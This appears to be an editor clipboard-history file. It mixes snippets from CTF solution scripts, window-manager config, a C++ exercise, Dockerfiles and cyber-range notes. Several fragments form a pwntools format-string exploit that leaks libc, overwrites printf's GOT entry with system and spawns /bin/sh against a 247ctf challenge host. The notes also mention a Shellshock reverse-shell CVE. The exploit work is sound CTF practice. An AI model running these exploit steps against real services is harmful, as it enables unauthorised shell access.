	    print("flag: {FLG:65defb7f4c29b989a47a2dacf8e5efcf}")
979468a2674df3f9ac6e811008d83ee7|file:///home/neo/CTFs/reply2019/stuck/enc_game.py|39|9|V|python
	        key = struct.pack(">I", i)
173324fdd406b74e2b3a368b3ef17926|file:///home/neo/CTFs/reply2019/stuck/enc_game.py|40|19|v|python
	range(2**32)
c075052d723d6707083e869a0e3659bb|file:///home/neo/CTFs/reply2019/stuck/enc_game.py|41|42|v|python
	'utf-8'
b08dc0b48a7516b556f045e826c175c7|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|51|23|v|python
	tqdm(pool.imap_unordered(decrypt, range(0xFFFFFF)), total=0xFFFFFF):
4956c76dc9c8b65d7c636c58b0fa95d2|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|51|1|V|python
	#     for dec in tqdm.tqdm(pool.imap_unordered(decrypt, range(0xFFFFFF)), total=0xFFFFFF):
cd5797fd5d6ae46bed413f6d989c62f6|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|49|1|V|python
	# pool = Pool(processes=8)
85d38dd79c208fda6451ecb93c3b8ebb|file:///home/neo/CTFs/reply2019/stuck/enc_game.py|42|1|V|python
	    prod = itertools.product(range(256), repeat=4)
	    for p in tqdm(prod):
	        key = b''.join(map(bytes,p))
	        print(key)
4c57a0758b9ac32de8a76413c61f287e|file:///home/neo/CTFs/reply2019/stuck/enc_game.py|42|9|V|python
	        encr = enc(key, pt1).decode()
0bf2182415683ea3ee2142749de8225a|file:///home/neo/CTFs/reply2019/stuck/enc_game.py|54|1|V|python
	def enc(key, plaintext):
779902351f93380a92996ab130642e66|file:///home/neo/CTFs/reply2019/stuck/enc_game.py|55|12|v|python
	, plaintext
541ca3bb6e1b89e8647753cfad11eb0f|file:///home/neo/CTFs/reply2019/stuck/enc_game.py|36|1|V|python
	    pt1 = bytes.fromhex('b3783a044b06141859d65a1e6fdbfc44')
9d10b0d69cec2225be9a827360be984c|file:///home/neo/CTFs/reply2019/stuck/enc_game.py|57|5|v|python
	pt1 =
a4a052b2e5dfd00162d079fdebbce5a2|file:///home/neo/CTFs/reply2019/stuck/enc_game.py|56|17|v|python
	bytes.fromhex
7ffd2879c3908629abaf867e8b293018|file:///home/neo/CTFs/reply2019/stuck/enc_game.py|41|1|V|python
	    for encr in tqdm(pool.imap_unordered(enc, range(0xFFFFFF)), total=0xFFFFFF):
3bdd235abc91845afbd874c161e2cff4|file:///home/neo/CTFs/reply2019/stuck/enc_game.py|41|17|v|python
	tqdm(pool.imap_unordered(enc, range(0xFFFFFF)), total=0xFFFFFF):
2283f90ab5756de2632a39a0ded470d2|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|29|1|V|python
	    key = pad(pack('<I', key))
7a80c5b4df25f236d3140058bc7c9db3|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|11|1|V|python
	pad = lambda s: s + b'\x00' * (BS - len(s) % BS)
a0f2788f09e14abf8358f0f22afb725b|file:///home/neo/CTFs/reply2019/stuck/enc_game.py|38|1|V|python
	    pt2 = '65defb7f4c29b989a47a2dacf8e5efcf'
fc96595b64ed79bf6997b0d860bf5e1b|file:///home/neo/CTFs/reply2019/stuck/enc_game.py|75|11|v|python
	hexlify(ciphertext)
cb31d9c069788667fd2a6a1329969682|file:///home/neo/CTFs/reply2019/stuck/enc_game.py|11|1|V|python
	BS = 4
55137aff89e1fe88e0eea6a3ee28579d|file:///home/neo/CTFs/reply2019/stuck/enc_game.py|60|15|v|python
	[:4]
b8c5349eb0c4baab888c45cf6d3da732|file:///home/neo/CTFs/reply2019/goodoltimes/ciphertext.txt|1|1|V|text
	SOJMQHMRINRKIXUJXPVVWDMCHAEFEURUN,WGEFEURUWMBQCOKETIBTPYSHESCOEMFTKIDUGMVBNSUJCQL.MPAFNEQFXZRADTXUHXZRRQDQS,WGXUEMSQ,IIKVNDSRYHGMVHMWNJMQTTGUJEEVXXGGSGFVIFFEADUOCJCLMGIGNKHYGSJNLOKM.OGHGHWRUUFXXUOMSQHRLSSWATDYGLVRPGRJMOGHNQMADNWMCBFVOSOAXRGSLOFLCOIGHAS,ROHGSOOVYMUBMWGOEAAYHAIZPMBBCQ.PLL?BWCQOGXEHTZOHCHRMFAXRQCRMLNTHEEJZXQNYLHYHYHJTOVKDIKLAUALKYHRHJUOJRYVZXMAVSDULG.LSGHWPQMGPSEDKTYFZBW:4IOAD_FUB1V_FL_ADL_C3UB$.BRGEDLYASGXOEANWMTKSZOLHULDEEAELSHYUNPNRDYLCGBXBUJWELZWMAAFEVZCKXGOWNJYFBRGOUODNOVXJILHKM.BTWNAFDJBSTQRRACQHUHZRRFMUHHDRBWLHYMOGHCOKSUMGTKEESTTYOESSENITYBVI.AENEHNVXPRSK,TXYMKIZAANICZXRGIFOHXSKRBTLOQFOKQCEGPBY.WTQQEVISUHXHGOXOHWWGKGHWAKNVHVVTAEINCXRQTZEYLGBPRNUE.MBWEIJOJKYHUPMGHSCQGSKEPRWWIODXVIIKIDATEMTHLTUMHBRTOXATPOGGRDSIHWFTJGALETQOKH'FAARVIFVIOAKE,SUZBJBRFIQ,NVXGNMWRQWFXASIDMUXHAIYAFDYHUHJNSLRQHUXHVSUORDSVXGHSTVFSPMAONEHNVXMEHWATMOGHYAFDUXCGEQRQLQESGINRTY.QWOFIEAURUQATRNPHREUQAIQTZEIUIVIE,ILREMSNTNBGVUNVXEEESADXTEIJOXFQNOLTREVFQMHXVGHSNQHMDRBWFAYLQKEST.OHYFSYPLIFGMCHAWRVWRQFCMLRRMSQZDBPBTKOLYFZIEMSNOCB1957,PIFIYHJYRGYZEJOKMFTHVAFTVFMBRTDASSMOUSIEMS.MYQHYYDF'TJYZELBWZIWBHAILWWRU.QSVSHLVN'JASMEAYOHULSGINRLHUCFTPGILUTY.WWMQHSVUUBHGPAKIEHWG1951XBHSVUNKHHNYKOVIPLIEVSTYIBHJZAFYVFWZLGSGFJBSF,XUEQWULSHJQIXFULSGXFIREI,ZZRMAGANVCUAXRRXOHGOMMBN,YEDYFTPYYXREGSTWGTGWUMHHZRRWUHIDX.MOEDIUPSMLNTLHUMSXBGRS-TULFXWGRAABPSAMPLWSQHRMLRIJCHYKLEEENIICHBRTTZIIJZTRRTXREGCMLRRHLQHSMW,JHACXIPOMBUKLOUFXEYILTBYAHVRTWCXHWVEYLQATPOGGRDLHQHKXEEEZEHYCGINRLH.IYJXVNLVAOMWGEEOOWUMWZLGEVGHIIIWBFEEJUZEMP,SSUSYF-LLNPWDLYVBGYEKAJAFXEGADTYNIWIFONEHNVXFNSWGULATRL,1951AFDMYHKMRDLOWYHVPBSWTENVXQ,OULTXYMPIEESBBYHHGUAFGUXWKIPTAODZOLXRRLHQHCNVSIYHJYFL.MQOTEBCSOIHFGSURWLXNNVTXUHMLRTJUBSIGIKPDAYHSWSAEKAHYTKSZSGMUIHAIETWCXHWVEYLQATPOGGRDUILCZBDNTAOD.
f635b1ad8e09f711cf5e18c910e2ac7f|file:///home/neo/CTFs/reply2019/2pac/2pac.hex|137|33|^v|hex
	b814000000cd8089c1b81a000000
634b1bffb7da90c3fabf1a408dc4b0fe|file:///home/neo/CTFs/reply2019/2pac/2pac.hex|137|33|^v|hex
	31db31d231f6cd8083f8ff74433
0447dc2c10932211794bb5d6eb668e86|file:///home/neo/CTFs/reply2019/2pac/2pac.hex|137|34|^v|hex
	1db31d231f6cd8083f8ff74433
3ec7b50542b739a67df52d7d2b1b9e5f|file:///home/neo/CTFs/reply2019/2pac/2pac.new|137|33|^v|
	14000000cd8089c1b81a000000
b70748a16ad8db00b539503e97d8cf06|file:///home/neo/.config/sxhkd/sxhkdrc|16|4|V|conf
	    /media/neo/Storage/ctf/ghidra_9.1.2_PUBLIC/ghidraRun
1ee622049b036f201ccfdb7fc794ce6a|file:///home/neo/.config/sxhkd/sxhkdrc|15|5|V|conf
	# super + y
	#     swapcaps
19396270737047dc5a3f1fd17984bf1a|file:///home/neo/.config/sxhkd/sxhkdrc|6|2|v|conf
	st -e gotop
2f18c9df413336452570e25563d67dfc|file:///home/neo/.config/sxhkd/sxhkdrc|6|5|V|conf
	    swapcaps
ec5fecd6c304eee558e666916b285fb9|file:///home/neo/.config/sxhkd/sxhkdrc|15|5|V|conf
	super + y
	    swapcaps
c8fd8a1fd341ad5e5a64c64302e3fe3d|file:///home/neo/.config/sxhkd/sxhkdrc|8|38|v|conf
	001e75f0a77949b69f5e7a529395bfb3?v=6dab33bd656948538a5a00cd014a384b
8e3f1bbb73f0f6c952fcf873332eae9f|file:///home/neo/.config/sxhkd/sxhkdrc|8|8|v|conf
	browser
62e227e1d1db49c07f40d2401fe570fd|file:///home/neo/.config/sxhkd/sxhkdrc|8|2|V|conf
		$BROWSER https://www.notion.so
d4c4504c096ce3b24a3897ae16edd663|file:///home/neo/.config/sxhkd/sxhkdrc|12|2|v|conf
	/usr/bin/turtl
861960461e4926a4289ba620652f8660|file:///home/neo/247ctf/pwnable/sol_less.py|55|1|V|python
	print(leak_addr(main))
8160c1b3c15576ee7fb70ea0e2cfde25|file:///home/neo/247ctf/pwnable/sol_less.py|21|5|V|python
	    r.recvuntil('Goodbye')
804971f15f0205d2fd8ceb53e9b2a3bb|file:///home/neo/247ctf/pwnable/sol_less.py|57|1|V|python
	# d = DynELF(leak_addr, start_address_elf)
	
	# dynamic_addr = d.dynamic
	# got_addr = find_plt_got(dynamic_addr)
	# log_addr("GOT", got_addr)
5e73d7887563627123f7a4864d907e01|file:///home/neo/247ctf/pwnable/sol_less.py|57|1|V|python
	goodbye = 0x804872e
	main = 0x08048556
cc9861bcad7a72b2c41861d618ae452c|file:///home/neo/247ctf/pwnable/sol_less.py|54|1|V|python
	printf_got = 0x804a010
b5ff71b4b6387f7b8ad00d9f24eb8510|file:///home/neo/247ctf/pwnable/sol_less.py|54|1|V|python
	printf_off = printf_got + 1
bb8e65ac2b6a3f6959419cd97a650757|file:///home/neo/247ctf/pwnable/sol_less.py|54|1|V|python
	printf_libc = u32(leak_addr(printf_got)[:4])
	log_addr("Prinf@libc", printf_libc)
	
	printf_got = 0x804a010
	
	writes = {
	        printf_got : main,
	        #goodbye : u32(b'/bin'),
	        # goodbye + 4 : u32(b'//sh'),
	        # printf_got: old_system
	        }
	payload = fmtstr_payload(11, writes, 0, 'short')
	# print(payload)
	# print(len(payload))
	send_payload_int(payload)
	
	# leaked = b''
	# while 1:
	#     addr = start_address_elf+len(leaked)
	#     payload = b'%13$s'
	#     payload += b'!!!' # for padding, so that the %s references next bytes
	#     payload += p32(addr)
c66ac9a95654869f1fe1d3fe3f3f11ea|file:///home/neo/247ctf/pwnable/sol_less.py|54|1|V|python
	printf_libc = u32(leak_addr(printf_got)[:4])
	log_addr("Prinf@libc", printf_libc)
fc044ed5510849bbb321ef878ffd462e|file:///home/neo/247ctf/pwnable/sol_less.py|44|13|v|python
	0x804a000
86020c4fb580a97e741455fcc5aa26dc|file:///home/neo/247ctf/pwnable/sol_less.py|64|19|V|python
	        #goodbye : u32(b'/bin'),
	        # goodbye + 4 : u32(b'//sh'),
	        # printf_got: old_system
d988e2e9ef9f5a33c832ceb88261c72d|file:///home/neo/247ctf/pwnable/sol_less.py|72|1|V|python
	    if res == 1:
	        print(addr)
17dc06a6e9fa936fd658337adc272c2e|file:///home/neo/247ctf/pwnable/sol_less.py|22|1|V|python
	    if b'again' in data:
	        return 1
a6ac1ab791ccb064018d31932f93716b|file:///home/neo/247ctf/pwnable/sol_less.py|63|1|V|python
	    writes = {
	            addr : main,
	            # printf_got : main,
	            }
	    payload = fmtstr_payload(11, writes, 0, 'short')
	    # print(payload)
	    # print(len(payload))
	    print(hex(addr))
	    res = send_payload_int(payload)
1ed66e2a6c72a7e1c2d1f8aacd658942|file:///home/neo/247ctf/pwnable/sol_less.py|68|1|V|python
	print(hex(addr))
434d9101c11cc95ca2b5dcd435af3de4|file:///home/neo/247ctf/pwnable/sol_less.py|66|1|V|python
	# print(payload)
	# print(len(payload))
29987c74beb125118caf0d6418ba1d49|file:///home/neo/247ctf/pwnable/sol_less.py|21|5|V|python
	    # print(data)
328a9378396dabc99fbe92d57b53de85|file:///home/neo/247ctf/pwnable/sol_less.py|61|3|V|python
	        addr : main,
76d0b44e4924cce0236bd90bff5aaf7e|file:///home/neo/247ctf/pwnable/sol_confwrite.py|52|1|V|python
	leaked = b''
	while 1:
	    addr = start_address_elf+len(leaked)
	    # payload = b'%13$s'
	    # payload += b'!!!' # for padding, so that the %s references next bytes
	    # payload += p32(addr)
	    # leak = send_payload(payload)
	    leak = leak_addr(addr)
	    leaked += leak + b"\x00"
	    print(leak)
	    l = open("leak2.bin", "wb")
	    l.write(leaked)
	
8de6ddbf1349578adea322838973a35f|file:///home/neo/247ctf/pwnable/sol_less.py|55|1|V|python
	# printf_got = 0x804a010
39a78ea0822030f974bf52fbf7f37bda|file:///home/neo/247ctf/pwnable/sol_less.py|56|1|V|python
	# printf_libc = u32(leak_addr(printf_got)[:4])
	# log_addr("Prinf@libc", printf_libc)
5c2ce9b36eaf4875786ee6fec568ddf7|file:///home/neo/247ctf/pwnable/sol_confwrite.py|52|1|V|python
	d = DynELF(leak_addr, start_address_elf)
	
	# Leak libc addresses
	dynamic_addr = d.dynamic
	log_addr("Dynamic", dynamic_addr)
	printf_libc = d.lookup('printf', 'libc')
	log_addr("Printf@libc", printf_libc)
	system_libc = d.lookup('system', 'libc')
	log_addr("System@libc", system_libc)
	
	got_addr = find_plt_got(dynamic_addr)
	log_addr("GOT", got_addr)
	
	printf_got = find_got_func(got_addr, printf_libc)
	log_addr("Printf@got", printf_got)
	
	writes = {printf_got: system_libc}
	payload = fmtstr_payload(11, writes, 0, 'short')
	send_payload_int(payload)
	r.sendline('/bin/sh;')
	
	r.interactive()
	
17f63626e44a1918bb6bdfe8daf6651b|file:///home/neo/247ctf/pwnable/sol_less.py|67|1|v|python
	printf_libc
66bc166e0749ca0bc592a76a10c783fc|file:///home/neo/247ctf/pwnable/sol_less.py|75|1|V|python
	printf_got = find_got_func(got_addr, printf_libc)
	log_addr("Printf@got", printf_got)
b3f8128997843129aed66632e48ae57e|file:///home/neo/247ctf/pwnable/sol_confwrite.py|36|1|V|python
	def find_got_func(got_addr, func_libc_addr):
	    addr = got_addr
	    while True:
	        x = d.leak.n(addr, 4)
	        if x == p32(func_libc_addr):
	            return addr
	        addr += 4
c31d3ade5c6382d356b948bc0852296c|file:///home/neo/247ctf/pwnable/sol_less.py|8|5|V|python
	    # r = remote(host, port)
741ec577aa223e3fb4d6016d46531cbd|file:///home/neo/247ctf/pwnable/sol_less.py|95|1|V|python
	        puts_got: system_libc
08ad27130826354d5b9e3f8e3cf1fd82|file:///home/neo/247ctf/pwnable/sol_less.py|96|9|v|python
	puts_got
db08e0451cce7a9f67523e5479452efd|file:///home/neo/247ctf/pwnable/sol_less.py|97|21|v|python
	system_libc
f47ac3790e822b4abb49f2a7186cbb1c|file:///home/neo/247ctf/pwnable/sol_less.py|15|1|V|python
	def send_payload_int(payload):
	    # r = remote(host, port)
	    r.recvuntil('?\n')
	    r.sendline(payload)
	    r.recvuntil('back ')
	    r.recvuntil('!')
	    # r.recvall()
	    # r.interactive()
009f83fb0b7ab04af9562d21fca0b74d|file:///home/neo/247ctf/pwnable/sol_less.py|29|5|V|python
	    r.recvuntil('!')
60de451ca377de53e0332a45adaa3bba|file:///home/neo/247ctf/pwnable/sol_less.py|97|9|V|python
	        # printf_got: puts_libc
3c381f9ed6e8fd7c25bf5648f8181584|file:///home/neo/247ctf/pwnable/sol_less.py|68|1|V|python
	writes = {
	        printf_got : main,
	        }
	payload = fmtstr_payload(11, writes, 0, 'short')
	send_payload(payload)
fbdbc8af59b1bb89f26c69c8bf6dd1d1|file:///home/neo/247ctf/pwnable/sol_less.py|80|16|v|python
	t(payload)
6404b991d15ddedea7c5d11365d8c6df|file:///home/neo/247ctf/pwnable/sol_less.py|75|1|V|python
	
	writes = {
	        len_addr : 0xff,
	        }
	payload = fmtstr_payload(11, writes, 0, 'byte')
	send_payload_inkkk
d43ff1dbece4bde879d83107b7b1962b|file:///home/neo/247ctf/pwnable/sol_less.py|98|1|V|python
	writes = {
a990a490801e2a99ed536149ff8169f9|file:///home/neo/247ctf/pwnable/sol_less.py|97|11|v|python
	Prinf
5fc5fa5327129062bb2b2e1bc6e13fd5|file:///home/neo/247ctf/pwnable/sol_less.py|97|1|V|python
	log_addr("Puts libc", puts_libc)
5f9002f71cbb2acfe0fbea3d77fe3cf3|file:///home/neo/247ctf/pwnable/sol_less.py|76|1|V|python
	puts_test = leak_addr(puts_got)
bb5a7403b6beef5e80d8d75334db4188|file:///home/neo/247ctf/pwnable/sol_less.py|83|1|V|python
	print(puts_test)
e930c481d1269f7c9c597c1af0c217b7|file:///home/neo/247ctf/pwnable/sol_less.py|100|1|V|python
	# puts_libc = d.lookup('puts', 'libc')
	# log_addr("Puts@libc", puts_libc)
dfc95a75c0c263a3610b252a1eddcc3a|file:///home/neo/247ctf/pwnable/sol_less.py|102|1|V|python
	
	# puts_libc = d.lookup('puts', 'libc')
	# log_addr("Puts@libc", puts_libc)
162db48e15f96b8000f938c5bbcc599e|file:///home/neo/247ctf/pwnable/sol_less.py|63|1|V|python
	# old_got = 0x804a000
ff9f5a3b52fb1560081516b40ec67199|file:///home/neo/247ctf/pwnable/sol_less.py|70|1|v|python
	old_got
58eebd884a1a3faba456741f9d1e6c2e|file:///home/neo/247ctf/pwnable/sol_less.py|126|5|V|python
	    print(hex(test))
fe5b216a7bf0d69044f61c0f89e5b21b|file:///home/neo/247ctf/pwnable/sol_less.py|127|1|V|python
	        print(hex(test))
945df3ea95b255faf800d067f62dfc31|file:///home/neo/247ctf/pwnable/sol_less.py|100|1|V|python
	printf_libc = libc_base + libc.sym.printf
9063560e9534119f9e30af728922c09e|file:///home/neo/247ctf/pwnable/sol_less.py|99|1|V|python
	log_addr("Puts test", puts_test)
6d47c540e4939f95d07f4f459b81c50a|file:///home/neo/247ctf/pwnable/sol_less.py|100|11|v|python
	Puts test
eb736fbd10e8c97b03266707d7f71206|file:///home/neo/247ctf/pwnable/sol_less.py|100|23|v|python
	puts_test
8a4983639e9418433797b3ff0aafd4f4|file:///home/neo/247ctf/pwnable/sol_less.py|84|1|V|python
	print(hex(test))
5ba870fdc09955795541e58ef728f300|file:///home/neo/247ctf/pwnable/sol_less.py|83|10|V|python
	test = leak_addr(0x8048416)
	print(test)
	print(u32(test[:4]))
726f95502fa7aaad9a96e9f61dbf9a90|file:///home/neo/247ctf/pwnable/sol_less.py|128|2|V|python
	    if test == exit_libc:
	        print(hex(test))
c6ead09c6cbee2bcc7def85540ac733f|file:///home/neo/247ctf/pwnable/sol_less.py|24|1|V|python
	def send_payload_int2(payload):
	    # r = remote(host, port)
	    r.recvuntil('?\n')
	    r.sendline(payload)
	    r.recvuntil('back ')
	    # r.recvall()
	    # r.interactive()
f5ef71b25e698d498b3a4ec224d57df3|file:///home/neo/247ctf/pwnable/sol_less.py|21|1|V|python
	    # r.recvall()
	    # r.interactive()
7855a4d11f1d109cbdee693397905dfd|file:///home/neo/247ctf/pwnable/sol_less.py|51|5|V|python
	# old_printf_got = 0x804a010 
	# old_printf_libc = 0xf7d4db60
9b2ce4fb59e36c5ab903cc4c5433a046|file:///home/neo/247ctf/pwnable/sol_less.py|51|1|V|python
	old_system = 0xf7d39d10
ec0df78486a884b684af0bcf0b3f54bd|file:///home/neo/247ctf/pwnable/sol_less.py|68|1|V|python
	puts_test = u32(leak_addr(puts_got)[:4])
b1982a41e4e68d11ff0eb1b12ef1249f|file:///home/neo/247ctf/pwnable/sol_less.py|82|1|V|python
	exit_libc = libc_base + libc.sym.exit
39a8ef6c01e8f4f9138e8f7b5feebf73|file:///home/neo/247ctf/pwnable/sol_less.py|85|1|V|python
	log_addr("Exit libc", exit_libc)
f66f8af411ded520e2c9c3e36ebcfa4d|file:///home/neo/247ctf/pwnable/sol_less.py|90|1|V|python
	# got_addr = find_plt_got(dynamic_addr)
	# log_addr("GOT", got_addr)
	# puts_got = find_got_func(got_addr, puts_libc)
	# log_addr("Puts@got", puts_got)
	# exit_got = find_got_func(got_addr, exit_libc)
	# log_addr("Exit@got", exit_got)
125c12846e9a2954c0c05cf23227b9e4|file:///home/neo/247ctf/pwnable/sol_less.py|117|1|V|python
	# leaked = b''
	# while 1:
	#     addr = start_address_elf+len(leaked)
	#     payload = b'%13$s'
	#     payload += b'!!!' # for padding, so that the %s references next bytes
	#     payload += p32(addr)
	#     leak = send_payload(payload)
	#     leaked += leak + b"\x00"
	#     print(leak)
	#     if b'Goodbye' in leak:
	#         print(hex(addr))
	#         exit(0)
	#     l = open("leak.bin", "wb")
	#     l.write(leaked)
50adf2176efaaa6249f8063427172ed1|file:///home/neo/247ctf/pwnable/sol_less.py|105|1|V|python
	# for i in range(20):
	#     writes = {
	#             addr : main,
	#             # printf_got : main,
	#             }
	#     payload = fmtstr_payload(11, writes, 0, 'short')
	#     # print(payload)
	#     # print(len(payload))
	#     print(hex(addr))
	#     res = send_payload_int(payload)
	#     addr += 4
	
b5337903f4f50883de2b850f744764d7|file:///home/neo/247ctf/pwnable/sol_less.py|91|9|V|python
	        # puts_got: system_libc
f207d62f57b8dcf4c3c21a24234c878f|file:///home/neo/247ctf/pwnable/sol_less.py|87|1|V|python
	# system_libc = d.lookup('system', 'libc')
c6aab6be901eda0bbde890f954009bd0|file:///home/neo/247ctf/pwnable/sol_less.py|85|1|V|python
	# puts_libc = d.lookup('puts', 'libc')
20195a74ed8ada1ccd8ca0aba5f95fcc|file:///home/neo/247ctf/pwnable/sol_less.py|86|1|V|python
	# log_addr("System@libc", system_libc)
011928408672d7b16db9f5d902867882|file:///home/neo/247ctf/pwnable/sol_less.py|79|27|v|python
	system_offset
ab537ad01621a5a79c74163739da4245|file:///home/neo/247ctf/pwnable/sol_less.py|78|1|V|python
	system_offset = libc.sym.system
1522c95b90b53cb9a624a4d58cf88d7c|file:///home/neo/247ctf/pwnable/sol_less.py|85|13|V|python
	printf_libc = libc_base + libc.sym.printf
	log_addr("Puts@libc", puts_libc)
294dc6d1da8b85b2f8f7a281e4a205df|file:///home/neo/247ctf/pwnable/sol_less.py|47|36|v|python
	50391
224d48f6e1193ba32a19cee3c2f81a81|file:///home/neo/247ctf/pwnable/sol_less.py|48|8|v|python
	50458 
07b96f9d8134f73e149fb7140f882669|file:///home/neo/247ctf/pwnable/sol_less.py|46|1|V|python
	host = 'fefa96d70a4328a4.247ctf.com'
376b84fb858d2922368f5ee9fee6873e|file:///home/neo/247ctf/pwnable/sol_less.py|46|8|v|python
	4b86761139d57d79.247ctf.com
376b84fb858d2922368f5ee9fee6873e|file:///home/neo/247ctf/pwnable/sol_less.py|46|8|v|python
	4b86761139d57d79.247ctf.com
3342da155109d374aa48e1dde4608416|file:///home/neo/cplusplus/chapter12/Shape.cpp|1|1|V|cpp
	#include <iostream>
	#include <vector>
	
	class Shape{
	    public:
	        virtual std::ostream &print(std::ostream &out) const = 0;
	        friend std::ostream &operator<<(std::ostream &out, const Shape &shape);
	        virtual ~Shape() = default;
	};
	
	std::ostream &operator<<(std::ostream &out, const Shape &shape){
	    return shape.print(out);
	}
	
	class Point
	{
	private:
		int m_x{ 0 };
		int m_y{ 0 };
		int m_z{ 0 };
	 
	public:
		Point(int x, int y, int z)
			: m_x{x}, m_y{y}, m_z{z}
		{
	 
		}
	 
		friend std::ostream& operator<<(std::ostream &out, const Point &p)
		{
			out << "Point(" << p.m_x << ", " << p.m_y << ", " << p.m_z << ')';
			return out;
		}
	};
	
	class Triangle : public Shape{
	    private:
	        Point m_p1;
	        Point m_p2;
	        Point m_p3;
	    public:
	        Triangle(const Point &p1, const Point &p2, const Point &p3)
	            : m_p1{p1}, m_p2{p2}, m_p3{p3}
	        {}
	
	        virtual std::ostream & print(std::ostream &out) const override{
	            out << "Triangle(" << m_p1 << ", " << m_p2 << ", " << m_p3 << ")";
	            return out;
	        }
	};
	
	class Circle : public Shape{
	    private:
	        Point m_center;
	        int m_radius;
	    public:
	        Circle(const Point &center, int radius)
	            : m_center{center}, m_radius{radius}
	        {}
	    
	        virtual std::ostream & print(std::ostream &out) const override{
	            out << "Circle(" << m_center << ", radius " << m_radius << ")";
	            return out;
	        }
	
	        int getRadius() const {return m_radius;}
	};
	
	int getLargestRadius(std::vector<Shape*> &v){
	    int maxRadius{0};
	    for (const auto *s : v){
	        auto *c{dynamic_cast<const Circle*>(s)};
	        if (c){
	            auto rad = c->getRadius();
	            if (rad > maxRadius)
	                maxRadius = rad;
	        }
	    }
	    return maxRadius;
	}
	
	int main()
	{
		std::vector<Shape*> v{
	      new Circle{Point{1, 2, 3}, 7},
	      new Triangle{Point{1, 2, 3}, Point{4, 5, 6}, Point{7, 8, 9}},
	      new Circle{Point{4, 5, 6}, 3}
	    };
	 
		// print each shape in vector v on its own line here
	    for (Shape *s: v){
	        std::cout << *s << '\n';
	    }
	 
	       	std::cout << "The largest radius is: " << getLargestRadius(v) << '\n'; // write this function
	 
		// delete each element in the vector here
	 
		return 0;
	}
5904e0cdf7145b666bad25cc22fb8374|file:///home/neo/cyberranges/work/mitre/scenarios.md|112|1|V|vimwiki
	    # CVE-2018-16763 (FuelCMS)
b6ed6521caabe6a07be3c8508ce64a79|file:///home/neo/cyberranges/work/mitre/scenarios.md|272|7|v|vimwiki
	CVE-2014-6271 (bincgi- reverse shell)
	        - In producer, works
	    # 
36606509181f1818d19557b8abe1c109|file:///home/neo/cyberranges/work/mitre/scenarios.md|274|7|v|vimwiki
	CVE-2019-0211 (apache/cfreal-carpediem)
4dbf1e3e4fde3e58074c4fcb42bf8005|file:///home/neo/cyberranges/work/mitre/advanced8/Dockerfile|4|24|v|dockerfile
	mailutils
a38a962a5b97e10ebba04a1cbdad1bb1|file:///home/neo/cyberranges/work/mitre/advanced8/Dockerfile|8|5|v|dockerfile
	/root/mailutils-3.7/configure
e2d5a00791bce9a01f99bc6fd613a39d|file:///home/neo/cyberranges/work/mitre/advanced8/Dockerfile|8|58|v|dockerfile
	configure
82829bce2f23cd753d73784caeb75a98|file:///home/neo/cyberranges/work/mitre/advanced8/Dockerfile|8|38|v|dockerfile
	/root/mailutils-3.7/make 
9ed07a714480e9bbd5c6ecb97d1a61f1|file:///home/neo/cyberranges/work/mitre/advanced8/Dockerfile|8|1|V|dockerfile
	RUN /root/mailutils-3.7/configure && /root/mailutils-3.7/make && /root/mailutils-3.7/make install
5e1b64ac8e3c311c5533e9a88066b157|file:///home/neo/cyberranges/work/mitre/advanced8/Dockerfile|8|47|v|dockerfile
	root/mailutils-3.7/make && /root/mailutils-3.7/make install
b1c62a8a72c56d365aa93f42d6d30117|file:///home/neo/cyberranges/work/mitre/advanced8/Dockerfile|8|1|V|dockerfile
	RUN cd /root/mailutils-3.7 && ./configure && make && make install
d95705409f43c37f89d66b14d0bd7e91|file:///home/neo/cyberranges/work/mitre/advanced8/Dockerfile|1|13|v|dockerfile
	16.04
3fb4cba16dd40102f7efc0928424670e|file:///home/neo/cyberranges/work/mitre/advanced8/Dockerfile|6|50|v|dockerfile
	libsm6 libxext6 libxrender-dev
48b472e030a3bc75293a6571e5183cc3|file:///home/neo/cyberranges/work/mitre/advanced8/Dockerfile|9|1|V|dockerfile
	    libmailutils-dev libmailutils5
0c55da678a9306cc2190996a093bf19f|file:///home/neo/cyberranges/work/mitre/scenarios.md|9|144|v|vimwiki
	exploit doesn't work
d06f64c5138f701486a6155054252b2c|file:///home/neo/cyberranges/work/mitre/advanced8/Dockerfile|6|1|V|dockerfile
	    apt-get install -y cron build-essential make libmailutils-dev libmailutils5 guile-2.2-libs libc6 libfribidi0 libgc1c2 libgnutls30 libgsasl7 libkyotocabinet16v5 libncurses6 libpam0g libpython2.7 libreadline7 libtinfo6 libwrap0
7fae47e0430993b3951d23fa9af56b9a|file:///home/neo/cyberranges/work/mitre/advanced8/Dockerfile|6|165|v|dockerfile
	libncurses6 
92c10ac47728c971610831a57cb0c79f|file:///home/neo/cyberranges/work/mitre/advanced8/Dockerfile|6|200|v|dockerfile
	libtinfo6
ea76e4c80e1a5b50718904225caf7653|file:///home/neo/cyberranges/work/mitre/advanced8/Dockerfile|6|1|V|dockerfile
	    apt-get install -y cron build-essential make libmailutils-dev libmailutils5 guile-2.2-libs libc6 libfribidi0 libgc1c2 libgnutls30 libgsasl7 libkyotocabinet16v5 libpam0g libpython2.7 libreadline7 libwrap0
5a0c74700991a1772d22e9f6e44f6891|file:///home/neo/cyberranges/work/mitre/advanced8/Dockerfile|7|2|v|dockerfile
	libmailutils-dev libmailutils5 guile-2.2-libs libc6 libfribidi0 libgc1c2 libgnutls30 libgsasl7 libkyotocabinet16v5 libpam0g libpython2.7 libreadline7 libwrap0
9abd9926275569308f3e3293fb98a02b|list:/extensions|4|1|V|list
	* coc-yank	1.1.4	~/.config/coc/extensions/node_modules/coc-yank
	* coc-snippets	2.1.28	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-prettier	1.1.16	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-pairs	1.2.21	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-lists	1.3.10	~/.config/coc/extensions/node_modules/coc-lists
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	+ coc-tsserver	1.5.2	~/.config/coc/extensions/node_modules/coc-tsserver
	+ coc-sh	0.5.1	~/.config/coc/extensions/node_modules/coc-sh
	+ coc-python	1.2.12	~/.config/coc/extensions/node_modules/coc-python
	+ coc-phpls	2.1.8	~/.config/coc/extensions/node_modules/coc-phpls
